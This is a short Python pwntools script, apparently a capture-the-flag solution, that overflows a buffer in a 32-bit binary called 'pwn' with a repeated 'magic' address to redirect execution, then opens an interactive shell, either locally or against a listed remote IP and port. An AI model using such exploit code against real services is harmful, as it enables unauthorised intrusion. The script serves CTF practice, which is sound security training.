#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote('111.198.29.45', 53692)
    #libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    #libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    #libc = ELF('./libc-2.xx.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    gogogo('bcall __isoc99_scanf')
    p.sla('>', 'a')
    magic = 0x080486CC
    payload = flat([p32(magic) * (0x68 // 0x4), 0x1])
    p.sla('>', payload)
    p.i()
